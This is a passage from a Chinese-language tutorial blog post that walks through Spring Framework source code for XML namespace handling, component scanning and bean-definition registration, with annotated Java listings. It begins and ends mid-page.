<p>名称空间与对应的NamespaceHandler的关系（保存在对应依赖包的META-INF&#x2F;spring.handlers下）：</p>
<p><img src="/../img/Snipaste_2022-01-02_08-19-51.png"></p>
<h3 id="代码3-2-17"><a href="#代码3-2-17" class="headerlink" title="代码3.2.17"></a>代码3.2.17</h3><p>org.springframework.beans.factory.xml.DefaultNamespaceHandlerResolver#resolve</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> NamespaceHandler <span class="title function_">resolve</span><span class="params">(String namespaceUri)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取所有名称空间映射</span></span><br><span class="line">    Map&lt;String, Object&gt; handlerMappings = getHandlerMappings();</span><br><span class="line">    <span class="comment">// 获取指定名称空间的处理器类</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">handlerOrClassName</span> <span class="operator">=</span> handlerMappings.get(namespaceUri);</span><br><span class="line">    <span class="keyword">if</span> (handlerOrClassName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (handlerOrClassName <span class="keyword">instanceof</span> NamespaceHandler) &#123;</span><br><span class="line">        <span class="keyword">return</span> (NamespaceHandler) handlerOrClassName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> (String) handlerOrClassName;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; handlerClass = ClassUtils.forName(className, <span class="built_in">this</span>.classLoader);</span><br><span class="line">            <span class="keyword">if</span> (!NamespaceHandler.class.isAssignableFrom(handlerClass)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FatalBeanException</span>(<span class="string">&quot;Class [&quot;</span> + className + <span class="string">&quot;] for namespace [&quot;</span> + namespaceUri +</span><br><span class="line">                                             <span class="string">&quot;] does not implement the [&quot;</span> + NamespaceHandler.class.getName() + <span class="string">&quot;] interface&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 实例化名称空间处理器</span></span><br><span class="line">            <span class="type">NamespaceHandler</span> <span class="variable">namespaceHandler</span> <span class="operator">=</span> (NamespaceHandler) BeanUtils.instantiateClass(handlerClass);</span><br><span class="line">            <span class="comment">// 调用处理器的init方法，以ContextNamespaceHandler为例，详细：代码3.2.18</span></span><br><span class="line">            namespaceHandler.init();</span><br><span class="line">            handlerMappings.put(namespaceUri, namespaceHandler);</span><br><span class="line">            <span class="keyword">return</span> namespaceHandler;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FatalBeanException</span>(<span class="string">&quot;NamespaceHandler class [&quot;</span> + className + <span class="string">&quot;] for namespace [&quot;</span> +</span><br><span class="line">                                         namespaceUri + <span class="string">&quot;] not found&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError err) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FatalBeanException</span>(<span class="string">&quot;Invalid NamespaceHandler class [&quot;</span> + className + <span class="string">&quot;] for namespace [&quot;</span> +</span><br><span class="line">                                         namespaceUri + <span class="string">&quot;]: problem with handler class file or dependent class&quot;</span>, err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-18"><a href="#代码3-2-18" class="headerlink" title="代码3.2.18"></a>代码3.2.18</h3><p>org.springframework.context.config.ContextNamespaceHandler#init</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ContextNamespaceHandler extends NamespaceHandlerSupport &#123;</span><br><span class="line"></span><br><span class="line">   @Override</span><br><span class="line">   public void init() &#123;</span><br><span class="line">      registerBeanDefinitionParser(&quot;property-placeholder&quot;, new PropertyPlaceholderBeanDefinitionParser());</span><br><span class="line">      registerBeanDefinitionParser(&quot;property-override&quot;, new PropertyOverrideBeanDefinitionParser());</span><br><span class="line">      registerBeanDefinitionParser(&quot;annotation-config&quot;, new AnnotationConfigBeanDefinitionParser());</span><br><span class="line">      // 由此可见：component-scan所对应的BeanDefinition解析器为ComponentScanBeanDefinitionParser</span><br><span class="line">      registerBeanDefinitionParser(&quot;component-scan&quot;, new ComponentScanBeanDefinitionParser());</span><br><span class="line">      registerBeanDefinitionParser(&quot;load-time-weaver&quot;, new LoadTimeWeaverBeanDefinitionParser());</span><br><span class="line">      registerBeanDefinitionParser(&quot;spring-configured&quot;, new SpringConfiguredBeanDefinitionParser());</span><br><span class="line">      registerBeanDefinitionParser(&quot;mbean-export&quot;, new MBeanExportBeanDefinitionParser());</span><br><span class="line">      registerBeanDefinitionParser(&quot;mbean-server&quot;, new MBeanServerBeanDefinitionParser());</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-19"><a href="#代码3-2-19" class="headerlink" title="代码3.2.19"></a>代码3.2.19</h3><p>org.springframework.beans.factory.xml.NamespaceHandlerSupport#parse</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> BeanDefinition <span class="title function_">parse</span><span class="params">(Element element, ParserContext parserContext)</span> &#123;</span><br><span class="line">    <span class="comment">// 根据元素名找到对应的Bean定义解析器后，调用解析器的parse方法，详细：代码3.2.20</span></span><br><span class="line">    <span class="keyword">return</span> findParserForElement(element, parserContext).parse(element, parserContext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> BeanDefinitionParser <span class="title function_">findParserForElement</span><span class="params">(Element element, ParserContext parserContext)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">localName</span> <span class="operator">=</span> parserContext.getDelegate().getLocalName(element);</span><br><span class="line">    <span class="comment">// 获取到元素名对应的BeanDefinitionParser，如：component-scan =&gt; ComponentScanBeanDefinitionParser</span></span><br><span class="line">    <span class="type">BeanDefinitionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="built_in">this</span>.parsers.get(localName);</span><br><span class="line">    <span class="keyword">if</span> (parser == <span class="literal">null</span>) &#123;</span><br><span class="line">        parserContext.getReaderContext().fatal(</span><br><span class="line">            <span class="string">&quot;Cannot locate BeanDefinitionParser for element [&quot;</span> + localName + <span class="string">&quot;]&quot;</span>, element);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> parser;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-20"><a href="#代码3-2-20" class="headerlink" title="代码3.2.20"></a>代码3.2.20</h3><p>org.springframework.context.annotation.ComponentScanBeanDefinitionParser#parse</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> BeanDefinition <span class="title function_">parse</span><span class="params">(Element element, ParserContext parserContext)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取context:component-scan元素的basePackage属性</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">basePackage</span> <span class="operator">=</span> element.getAttribute(BASE_PACKAGE_ATTRIBUTE);</span><br><span class="line">    basePackage = parserContext.getReaderContext().getEnvironment().resolvePlaceholders(basePackage);</span><br><span class="line">    String[] basePackages = StringUtils.tokenizeToStringArray(basePackage,</span><br><span class="line">                                                              ConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Actually scan for bean definitions and register them.</span></span><br><span class="line">    <span class="type">ClassPathBeanDefinitionScanner</span> <span class="variable">scanner</span> <span class="operator">=</span> configureScanner(parserContext, element);</span><br><span class="line">    <span class="comment">// 扫描指定的包路径，详细：代码3.2.21</span></span><br><span class="line">    Set&lt;BeanDefinitionHolder&gt; beanDefinitions = scanner.doScan(basePackages);</span><br><span class="line">   	<span class="comment">// 注册组件，详细：代码3.2.26</span></span><br><span class="line">    registerComponents(parserContext.getReaderContext(), beanDefinitions, element);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-21"><a href="#代码3-2-21" class="headerlink" title="代码3.2.21"></a>代码3.2.21</h3><p>org.springframework.context.annotation.ClassPathBeanDefinitionScanner#doScan</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Set&lt;BeanDefinitionHolder&gt; <span class="title function_">doScan</span><span class="params">(String... basePackages)</span> &#123;</span><br><span class="line">    Assert.notEmpty(basePackages, <span class="string">&quot;At least one base package must be specified&quot;</span>);</span><br><span class="line">    Set&lt;BeanDefinitionHolder&gt; beanDefinitions = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;BeanDefinitionHolder&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String basePackage : basePackages) &#123;</span><br><span class="line">        <span class="comment">// 扫描到指定包路径下所有组件，封装BeanDefinition保存到set中</span></span><br><span class="line">        Set&lt;BeanDefinition&gt; candidates = findCandidateComponents(basePackage);</span><br><span class="line">        <span class="keyword">for</span> (BeanDefinition candidate : candidates) &#123;</span><br><span class="line">            <span class="type">ScopeMetadata</span> <span class="variable">scopeMetadata</span> <span class="operator">=</span> <span class="built_in">this</span>.scopeMetadataResolver.resolveScopeMetadata(candidate);</span><br><span class="line">            candidate.setScope(scopeMetadata.getScopeName());</span><br><span class="line">            <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> <span class="built_in">this</span>.beanNameGenerator.generateBeanName(candidate, <span class="built_in">this</span>.registry);</span><br><span class="line">            <span class="keyword">if</span> (candidate <span class="keyword">instanceof</span> AbstractBeanDefinition) &#123;</span><br><span class="line">                <span class="comment">// BeanDefinition的后续处理，如：懒加载（默认false）、自动注入（默认不自动注入）、依赖检查、初始化方法等等</span></span><br><span class="line">                postProcessBeanDefinition((AbstractBeanDefinition) candidate, beanName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (candidate <span class="keyword">instanceof</span> AnnotatedBeanDefinition) &#123;</span><br><span class="line">                <span class="comment">// 处理定义注解，如：@Lazy、@Primary、@DependsOn等等</span></span><br><span class="line">                AnnotationConfigUtils.processCommonDefinitionAnnotations((AnnotatedBeanDefinition) candidate);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (checkCandidate(beanName, candidate)) &#123;</span><br><span class="line">                <span class="comment">// 创建BeanDefinitionHolder，包含bean名称、定义、别名</span></span><br><span class="line">                <span class="type">BeanDefinitionHolder</span> <span class="variable">definitionHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionHolder</span>(candidate, beanName);</span><br><span class="line">                definitionHolder =</span><br><span class="line">                    AnnotationConfigUtils.applyScopedProxyMode(scopeMetadata, definitionHolder, <span class="built_in">this</span>.registry);</span><br><span class="line">                <span class="comment">// 把BeanDefinitionHolder保存到set集合，最后作为方法结果返回</span></span><br><span class="line">                beanDefinitions.add(definitionHolder);</span><br><span class="line">                <span class="comment">// 注册bean定义，详细：代码3.2.22</span></span><br><span class="line">                registerBeanDefinition(definitionHolder, <span class="built_in">this</span>.registry);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> beanDefinitions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-22"><a href="#代码3-2-22" class="headerlink" title="代码3.2.22"></a>代码3.2.22</h3><p>org.springframework.context.annotation.ClassPathBeanDefinitionScanner#registerBeanDefinition</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">registerBeanDefinition</span><span class="params">(BeanDefinitionHolder definitionHolder, BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用BeanDefinitionReaderUtils的registerBeanDefinition，注册bean定义，详细：代码3.2.23</span></span><br><span class="line">    BeanDefinitionReaderUtils.registerBeanDefinition(definitionHolder, registry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-23"><a href="#代码3-2-23" class="headerlink" title="代码3.2.23"></a>代码3.2.23</h3><p>org.springframework.beans.factory.support.BeanDefinitionReaderUtils#registerBeanDefinition</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBeanDefinition</span><span class="params">(</span></span><br><span class="line"><span class="params">    BeanDefinitionHolder definitionHolder, BeanDefinitionRegistry registry)</span></span><br><span class="line">    <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register bean definition under primary name.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> definitionHolder.getBeanName();</span><br><span class="line">    <span class="comment">// 调用registry的registerBeanDefinition，这里的registry也即DefaultListableBeanFactory，详细：代码3.2.24</span></span><br><span class="line">    registry.registerBeanDefinition(beanName, definitionHolder.getBeanDefinition());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register aliases for bean name, if any.</span></span><br><span class="line">    <span class="comment">// 如果bean名称存在别名，则也注册别名，保存到map，key为别名，value为bean名称</span></span><br><span class="line">    String[] aliases = definitionHolder.getAliases();</span><br><span class="line">    <span class="keyword">if</span> (aliases != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (String alias : aliases) &#123;</span><br><span class="line">            registry.registerAlias(beanName, alias);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-24"><a href="#代码3-2-24" class="headerlink" title="代码3.2.24"></a>代码3.2.24</h3><p>org.springframework.beans.factory.support.DefaultListableBeanFactory#registerBeanDefinition</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span></span><br><span class="line">    <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"></span><br><span class="line">    Assert.hasText(beanName, <span class="string">&quot;Bean name must not be empty&quot;</span>);</span><br><span class="line">    Assert.notNull(beanDefinition, <span class="string">&quot;BeanDefinition must not be null&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (beanDefinition <span class="keyword">instanceof</span> AbstractBeanDefinition) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// bean定义校验</span></span><br><span class="line">            ((AbstractBeanDefinition) beanDefinition).validate();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line">                                                   <span class="string">&quot;Validation of bean definition failed&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanDefinition</span> <span class="variable">existingDefinition</span> <span class="operator">=</span> <span class="built_in">this</span>.beanDefinitionMap.get(beanName);</span><br><span class="line">    <span class="keyword">if</span> (existingDefinition != <span class="literal">null</span>) &#123;	<span class="comment">// 已经存在这样的bean定义的情况</span></span><br><span class="line">        <span class="keyword">if</span> (!isAllowBeanDefinitionOverriding()) &#123;		<span class="comment">// 不允许bean定义覆盖，则直接报错</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line">                                                   <span class="string">&quot;Cannot register bean definition [&quot;</span> + beanDefinition + <span class="string">&quot;] for bean &#x27;&quot;</span> + beanName +</span><br><span class="line">                                                   <span class="string">&quot;&#x27;: There is already [&quot;</span> + existingDefinition + <span class="string">&quot;] bound.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (existingDefinition.getRole() &lt; beanDefinition.getRole()) &#123;</span><br><span class="line">            <span class="comment">// e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE</span></span><br><span class="line">            <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(<span class="string">&quot;Overriding user-defined bean definition for bean &#x27;&quot;</span> + beanName +</span><br><span class="line">                            <span class="string">&quot;&#x27; with a framework-generated bean definition: replacing [&quot;</span> +</span><br><span class="line">                            existingDefinition + <span class="string">&quot;] with [&quot;</span> + beanDefinition + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!beanDefinition.equals(existingDefinition)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">                logger.info(<span class="string">&quot;Overriding bean definition for bean &#x27;&quot;</span> + beanName +</span><br><span class="line">                            <span class="string">&quot;&#x27; with a different definition: replacing [&quot;</span> + existingDefinition +</span><br><span class="line">                            <span class="string">&quot;] with [&quot;</span> + beanDefinition + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">&quot;Overriding bean definition for bean &#x27;&quot;</span> + beanName +</span><br><span class="line">                             <span class="string">&quot;&#x27; with an equivalent definition: replacing [&quot;</span> + existingDefinition +</span><br><span class="line">                             <span class="string">&quot;] with [&quot;</span> + beanDefinition + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;		<span class="comment">// 不存在这样的bean定义的情况</span></span><br><span class="line">        <span class="keyword">if</span> (hasBeanCreationStarted()) &#123;		<span class="comment">// 这里加锁的原因：避免系统使用后，手动注册bean定义到容器，带来的安全隐患，详细：代码3.2.25</span></span><br><span class="line">            <span class="comment">// Cannot modify startup-time collection elements anymore (for stable iteration)</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>.beanDefinitionMap) &#123;</span><br><span class="line">                <span class="built_in">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">                List&lt;String&gt; updatedDefinitions = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(<span class="built_in">this</span>.beanDefinitionNames.size() + <span class="number">1</span>);</span><br><span class="line">                updatedDefinitions.addAll(<span class="built_in">this</span>.beanDefinitionNames);</span><br><span class="line">                updatedDefinitions.add(beanName);</span><br><span class="line">                <span class="built_in">this</span>.beanDefinitionNames = updatedDefinitions;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.manualSingletonNames.contains(beanName)) &#123;</span><br><span class="line">                    Set&lt;String&gt; updatedSingletons = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;String&gt;(<span class="built_in">this</span>.manualSingletonNames);</span><br><span class="line">                    updatedSingletons.remove(beanName);</span><br><span class="line">                    <span class="built_in">this</span>.manualSingletonNames = updatedSingletons;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Still in startup registration phase</span></span><br><span class="line">            <span class="comment">// bean名称与定义对应关系保存到beanDefinitionMap</span></span><br><span class="line">            <span class="built_in">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">            <span class="comment">// bean名称保存到beanDefinitionNames（list集合）</span></span><br><span class="line">            <span class="built_in">this</span>.beanDefinitionNames.add(beanName);</span><br><span class="line">            <span class="built_in">this</span>.manualSingletonNames.remove(beanName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.frozenBeanDefinitionNames = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (existingDefinition != <span class="literal">null</span> || containsSingleton(beanName)) &#123;</span><br><span class="line">        resetBeanDefinition(beanName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-25"><a href="#代码3-2-25" class="headerlink" title="代码3.2.25"></a>代码3.2.25</h3><p>org.springframework.beans.factory.support.AbstractBeanFactory#hasBeanCreationStarted</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;String&gt; alreadyCreated =</span><br><span class="line">    Collections.newSetFromMap(<span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Boolean&gt;(<span class="number">256</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">hasBeanCreationStarted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">this</span>.alreadyCreated.isEmpty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-26"><a href="#代码3-2-26" class="headerlink" title="代码3.2.26"></a>代码3.2.26</h3><p>org.springframework.context.annotation.ComponentScanBeanDefinitionParser#registerComponents</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ANNOTATION_CONFIG_ATTRIBUTE</span> <span class="operator">=</span> <span class="string">&quot;annotation-config&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">registerComponents</span><span class="params">(</span></span><br><span class="line"><span class="params">    XmlReaderContext readerContext, Set&lt;BeanDefinitionHolder&gt; beanDefinitions, Element element)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">source</span> <span class="operator">=</span> readerContext.extractSource(element);</span><br><span class="line">    <span class="type">CompositeComponentDefinition</span> <span class="variable">compositeDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CompositeComponentDefinition</span>(element.getTagName(), source);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (BeanDefinitionHolder beanDefHolder : beanDefinitions) &#123;</span><br><span class="line">        compositeDef.addNestedComponent(<span class="keyword">new</span> <span class="title class_">BeanComponentDefinition</span>(beanDefHolder));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register annotation config processors, if necessary.</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">annotationConfig</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (element.hasAttribute(ANNOTATION_CONFIG_ATTRIBUTE)) &#123;</span><br><span class="line">        annotationConfig = Boolean.valueOf(element.getAttribute(ANNOTATION_CONFIG_ATTRIBUTE));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注册注解配置处理器（除非元素节点annotation-config属性设为false，这里针对的是context:component-scan元素对应的bean定义解析器）</span></span><br><span class="line">    <span class="keyword">if</span> (annotationConfig) &#123;</span><br><span class="line">        <span class="comment">// 注册注解配置处理器，详细：代码3.2.27</span></span><br><span class="line">        Set&lt;BeanDefinitionHolder&gt; processorDefinitions =</span><br><span class="line">            AnnotationConfigUtils.registerAnnotationConfigProcessors(readerContext.getRegistry(), source);</span><br><span class="line">        <span class="keyword">for</span> (BeanDefinitionHolder processorDefinition : processorDefinitions) &#123;</span><br><span class="line">            compositeDef.addNestedComponent(<span class="keyword">new</span> <span class="title class_">BeanComponentDefinition</span>(processorDefinition));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发组件注册完成事件</span></span><br><span class="line">    readerContext.fireComponentRegistered(compositeDef);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-27"><a href="#代码3-2-27" class="headerlink" title="代码3.2.27"></a>代码3.2.27</h3><p>org.springframework.context.annotation.AnnotationConfigUtils#registerAnnotationConfigProcessors(org.springframework.beans.factory.support.BeanDefinitionRegistry, java.lang.Object)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Set&lt;BeanDefinitionHolder&gt; <span class="title function_">registerAnnotationConfigProcessors</span><span class="params">(</span></span><br><span class="line"><span class="params">    BeanDefinitionRegistry registry, Object source)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">DefaultListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> unwrapDefaultListableBeanFactory(registry);</span><br><span class="line">    <span class="keyword">if</span> (beanFactory != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(beanFactory.getDependencyComparator() <span class="keyword">instanceof</span> AnnotationAwareOrderComparator)) &#123;</span><br><span class="line">            beanFactory.setDependencyComparator(AnnotationAwareOrderComparator.INSTANCE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(beanFactory.getAutowireCandidateResolver() <span class="keyword">instanceof</span> ContextAnnotationAutowireCandidateResolver)) &#123;</span><br><span class="line">            beanFactory.setAutowireCandidateResolver(<span class="keyword">new</span> <span class="title class_">ContextAnnotationAutowireCandidateResolver</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Set&lt;BeanDefinitionHolder&gt; beanDefs = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;BeanDefinitionHolder&gt;(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册org.springframework.context.annotation.internalConfigurationAnnotationProcessor</span></span><br><span class="line">    <span class="keyword">if</span> (!registry.containsBeanDefinition(CONFIGURATION_ANNOTATION_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(ConfigurationClassPostProcessor.class);</span><br><span class="line">        def.setSource(source);</span><br><span class="line">        beanDefs.add(registerPostProcessor(registry, def, CONFIGURATION_ANNOTATION_PROCESSOR_BEAN_NAME));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册org.springframework.context.annotation.internalAutowiredAnnotationProcessor</span></span><br><span class="line">    <span class="keyword">if</span> (!registry.containsBeanDefinition(AUTOWIRED_ANNOTATION_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(AutowiredAnnotationBeanPostProcessor.class);</span><br><span class="line">        def.setSource(source);</span><br><span class="line">        beanDefs.add(registerPostProcessor(registry, def, AUTOWIRED_ANNOTATION_PROCESSOR_BEAN_NAME));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册org.springframework.context.annotation.internalRequiredAnnotationProcessor</span></span><br><span class="line">    <span class="keyword">if</span> (!registry.containsBeanDefinition(REQUIRED_ANNOTATION_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(RequiredAnnotationBeanPostProcessor.class);</span><br><span class="line">        def.setSource(source);</span><br><span class="line">        beanDefs.add(registerPostProcessor(registry, def, REQUIRED_ANNOTATION_PROCESSOR_BEAN_NAME));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for JSR-250 support, and if present add the CommonAnnotationBeanPostProcessor.</span></span><br><span class="line">    <span class="comment">// 注册org.springframework.context.annotation.internalCommonAnnotationProcessor</span></span><br><span class="line">    <span class="keyword">if</span> (jsr250Present &amp;&amp; !registry.containsBeanDefinition(COMMON_ANNOTATION_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(CommonAnnotationBeanPostProcessor.class);</span><br><span class="line">        def.setSource(source);</span><br><span class="line">        beanDefs.add(registerPostProcessor(registry, def, COMMON_ANNOTATION_PROCESSOR_BEAN_NAME));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for JPA support, and if present add the PersistenceAnnotationBeanPostProcessor.</span></span><br><span class="line">    <span class="comment">// 注册org.springframework.context.annotation.internalPersistenceAnnotationProcessor（需要配置jpa）</span></span><br><span class="line">    <span class="keyword">if</span> (jpaPresent &amp;&amp; 